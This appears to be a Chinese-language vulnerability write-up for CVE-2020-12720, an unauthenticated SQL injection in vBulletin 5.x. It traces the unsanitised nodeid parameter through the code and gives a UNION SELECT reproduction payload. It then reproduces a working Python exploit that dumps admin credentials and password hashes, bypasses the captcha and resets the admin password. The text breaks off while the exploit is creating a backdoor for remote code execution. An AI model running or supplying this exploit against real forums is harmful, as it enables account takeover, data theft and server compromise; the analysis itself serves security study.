<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-12720vbulletin--未授权sql注入漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-12720</span><span class="csECDA2D3">）</span><span class="csDE05BCC">vBulletin </span><span class="csECDA2D3">未授权</span><span class="csDE05BCC">sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">未经授权的用户可以通过</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入获取敏感数据</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">vBulletin 5.5.6pl1</span><span class="cs9C1B1871">之前版本</span></p><p class="cs40DD2BC9"><span class="cs8926E06">vBulletin 5.6.0pl1</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">5.6.0</span><span class="cs9C1B1871">版本</span></p><p class="cs40DD2BC9"><span class="cs8926E06">vBulletin 5.6.1pl1</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">5.6.1</span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞文件：</span><span class="cs8926E06">/core/vb/library/content.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="331" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">fillContentTableData</span><span class="cs9C1B1871">方法，直接调用了</span><span class="cs8926E06">getRow</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="148" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此处</span><span class="cs8926E06">getRow</span><span class="cs9C1B1871">方法传入的第一个参数为</span><span class="cs8926E06">&#39;vBForum:getContentTablesData&#39;</span><span class="cs9C1B1871">，全局搜索</span><span class="cs8926E06">getContentTablesData</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">nodeid</span><span class="cs9C1B1871">被设置为常量</span><span class="cs8926E06">TYPE_NOCLEAN</span><span class="cs9C1B1871">的值，该值为</span><span class="cs8926E06">0</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">cleanArray</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="144" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">变量</span><span class="cs8926E06">vartype</span><span class="cs9C1B1871">经过数组处理后即为</span><span class="cs8926E06">TYPE_NOCLEAN</span><span class="cs9C1B1871">，随后调用</span><span class="cs8926E06">doClean</span><span class="cs9C1B1871">方法进行数据清洗</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="191" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">doClean</span><span class="cs9C1B1871">方法会根据传入的</span><span class="cs8926E06">type</span><span class="cs9C1B1871">数值进入到不同的分支进行处理，因为变量</span><span class="cs8926E06">vartype</span><span class="cs9C1B1871">为</span><span class="cs8926E06">0</span><span class="cs9C1B1871">直接进入到</span><span class="cs8926E06">TYPE_NOCLEAN</span><span class="cs9C1B1871">的分支，从而不做清洗处理。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再回到</span><span class="cs8926E06">/core/packages/vbforum/db/mysql/querydefs.php</span><span class="cs9C1B1871">文件中，发现后续并没有再对</span><span class="cs8926E06">nodeid</span><span class="cs9C1B1871">键值进行处理，直接拼接到</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句中，造成了</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入漏洞。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="146" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">至于如何利用，就不赘述了，向上追溯调用链即可。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">nodeId[nodeid]=1 AND text.nodeid = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,user(),19,20,21,22,23,24,25,26--</span></p><p class="cs40DD2BC9"><span><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="201" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">打个断点就能快速定位漏洞点</span><span class="cs8926E06"><br/><img src="Web安全/vBulletin/%ef%bc%88CVE-2020-12720%ef%bc%89vBulletin%20%20%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="340" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">CVE-2020-12720.py</span></p><p class="cs3A447A38"><span class="cs9FB05234"># Exploit Title: vBulletin 5.6.1 - &#39;nodeId&#39; SQL Injection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 2020-05-15</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Author: Photubias</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Advisory: [1] https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: vBulletin v5.6.x (prior to Patch Level 1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: vBulletin v5.6.1 on Debian 10 x64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE: CVE-2020-12720 vBulletin v5.6.1 (SQLi) with path to RCE</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Copyright 2020 Photubias(c)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This program is free software: you can redistribute it and/or modify</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;it under the terms of the GNU General Public License as published by</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the Free Software Foundation, either version 3 of the License, or</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(at your option) any later version.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This program is distributed in the hope that it will be useful,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;but WITHOUT ANY WARRANTY; without even the implied warranty of</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. &nbsp;See the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GNU General Public License for more details.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You should have received a copy of the GNU General Public License</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;along with this program. &nbsp;If not, see &lt;http://www.gnu.org/licenses/&gt;.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File name CVE-2020-12720.py</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This is a native implementation without requirements, written in Python 3.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Works equally well on Windows as Linux (as MacOS, probably ;-)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##--&gt;&gt; Full creds to @zenofex and @rekter0 &lt;&lt;--##</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import urllib.request, urllib.parse, sys, http.cookiejar, ssl, random, string</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">## Static vars; change at will, but recommend leaving as is</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sADMINPASS = &#39;12345678&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sCMD = &#39;id&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sURL = &#39;http://192.168.50.130/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sUSERID = &#39;1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sNEWPASS = &#39;87654321&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">iTimeout = 5</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">## Ignore unsigned certs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ssl._create_default_https_context = ssl._create_unverified_context</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">## Keep track of cookies between requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cj = http.cookiejar.CookieJar()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def randomString(stringLength=8):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;letters = string.ascii_lowercase</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return &#39;&#39;.join(random.choice(letters) for i in range(stringLength))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def getData(sUrl, lData):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oData = urllib.parse.urlencode(lData).encode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oRequest = urllib.request.Request(url = sUrl, data = oData)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return oOpener.open(oRequest, timeout = iTimeout)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;----- ERROR, site down?&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def verifyBug(sURL,sUserid=&#39;1&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,&quot;cve-2020-12720&quot;,8,7,6,5,4,3,2,1;--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not &#39;cve-2020-12720&#39; in sResponse:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[!] Warning: not vulnerable to CVE-2020-12720, credentials are needed!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[+] SQLi Success!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def takeoverAccount(sURL, sNEWPASS):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;### Source: https://github.com/rekter0/exploits/tree/master/CVE-2020-12720</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Get Table Prefixes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1 from information_schema.columns WHERE column_name=\&#39;phrasegroup_cppermission\&#39;;--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;rawtext&#39; in sResponse: sPrefix = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;language&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else: sPrefix = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#print(&#39;[+] Got table prefix &quot;&#39;+sPrefix+&#39;&quot;&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Get usergroup ID for &quot;Administrators&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,usergroupid,8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;usergroup WHERE title=\&#39;Administrators\&#39;;--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sGroupID = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#print(&#39;[+] Administrators Group ID: &#39;+sGroupID)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Get admin data, including original token (password hash), TODO: an advanced exploit could restore the original hash in post exploitation</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,concat(username,0x7c,userid,0x7c,email,0x7c,token),8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;user where usergroupid=&#39; + sGroupID + &#39;;--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sUsername,sUserid,sUsermail,sUserTokenOrg = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;).split(&#39;|&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#print(&#39;[+] Got original token (&#39; + sUsername + &#39;, &#39; + sUsermail + &#39;): &#39; + sUserTokenOrg)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Let&#39;s create a Human Verify Captcha</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/hv/generateToken?&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;securitytoken&#39;:&#39;guest&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;hash&#39; in sResponse: sHash = sResponse.split(&#39;hash&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else: sHash = &#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Get the captcha answer from DB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39;:&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,count(answer),8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;humanverify limit 0,1--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;rawtext&#39; in sResponse: iAnswers = int(sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else: iAnswers = 1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39;:&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,answer,8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;humanverify limit &#39; + str(iAnswers-1) + &#39;,1--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;rawtext&#39; in sResponse: sAnswer = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else: sAnswer = &#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Now request PW reset and retrieve the token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;auth/lostpw&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;email&#39;:sUsermail,&#39;humanverify[input]&#39;:sAnswer,&#39;humanverify[hash]&#39;:sHash,&#39;securitytoken&#39;:&#39;guest&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;nodeId[nodeid]&#39;:&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,activationid,8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;useractivation WHERE userid=&#39; + sUserid + &#39; limit 0,1--&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;rawtext&#39; in sResponse: sToken = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;}&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else: sToken = &#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Finally the password reset itself</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;auth/reset-password&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;userid&#39;:sUserid,&#39;activationid&#39;:sToken,&#39;new-password&#39;:sNEWPASS,&#39;new-password-confirm&#39;:sNEWPASS,&#39;securitytoken&#39;:&#39;guest&#39;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sResponse = getData(sURL + sPath, lData).read().decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if not &#39;Logging in&#39; in sResponse:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[-] Failed to reset the password&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;[+] Success! User &#39; + sUsername + &#39; now has password &#39; + sNEWPASS)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return sUserid</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def createBackdoor(sURL, sADMINPASS, sUserid=&#39;1&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;## Activating Sitebuilder</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sPath = &#39;ajax/activate-sitebuilder&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;lData = {&#39;pageid&#39;:&#39;1&#39;, &#39;nodeid&#39;:&#39;0&#39;,&#39;userid&#39;:&#39;1&#39;,&#39;loadMenu&#39;:&#39;false&#39;, &#39;isAjaxTemplateRender&#39;:&#39;true&#39;, 